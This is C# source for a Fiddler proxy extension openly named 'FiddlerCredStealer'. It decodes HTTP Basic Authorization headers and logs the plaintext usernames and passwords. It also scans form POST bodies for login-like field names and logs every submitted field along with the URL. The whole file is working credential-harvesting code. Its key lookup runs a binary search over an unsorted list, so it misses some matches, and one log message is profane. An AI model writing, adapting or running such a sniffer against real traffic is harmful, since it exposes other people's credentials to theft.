using System;
using Fiddler;

namespace FiddlerCredStealer
{
    public class FiddlerCredStealer : Fiddler.IAutoTamper
    {
        public void AutoTamperRequestAfter(Session oSession)
        {

            if (oSession.RequestHeaders.Exists("Authorization"))
            {
                // Steal them creds 
                String authLine = oSession.RequestHeaders["Authorization"];
                if (!authLine.StartsWith("Basic"))
                    return;
                String creds = authLine.Substring("Basic ".Length);
                // Creds are base64 encoded!
                creds = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(creds));
                FiddlerApplication.Log.LogFormat("Found creds for {0} -> {1} ", oSession.fullUrl, creds);
                return;

            }
            try
            {
                if (oSession.RequestMethod.Equals("POST") && oSession.RequestHeaders.ExistsAndContains("Content-Type", "x-www-form-urlencoded"))
                {
                    var PostData = System.Web.HttpUtility.ParseQueryString(oSession.GetRequestBodyAsString());

                    // Content that isn't POST data -> NullPointerException
                    if(PostData == null) return;

                    // Content that really isn't helpful -> Wasted.
                    if (!PostData.HasKeys()) return;

                    // For everything else, There's ForEach
                    foreach (string postKey in PostData.Keys)
                    {
                        if (Array.BinarySearch(searchKeys, postKey.ToLower()) >= 0)
                        {
                            FiddlerApplication.Log.LogString("Found potential login at < " + oSession.fullUrl + " > ");
                            foreach (string cPostKey in PostData.Keys)
                                FiddlerApplication.Log.LogString(cPostKey + " => \"" + PostData[cPostKey] + "\"");
                            oSession["ui-color"] = "blue";
                            break;
                        }
                    }
                }
            }
            catch (Exception ee)
            {
                FiddlerApplication.Log.LogString("FUCK THIS SHIT: " + ee.ToString());
            }
        }

        string[] searchKeys = {
            "user",
            "pass",
            "name",
            "password",
            "username",
            "p",
            "u",
            "post"
        };



        #region unused 
        public void AutoTamperRequestBefore(Session oSession) { /* noop */ }
        public void AutoTamperResponseAfter(Session oSession) { /* noop */ }
        public void AutoTamperResponseBefore(Session oSession) { /* noop */ }
        public void OnBeforeReturningError(Session oSession) { /* noop */ }
        public void OnBeforeUnload() { /* noop */ }
        public void OnLoad() { /* noop */ }
        #endregion
    }
}
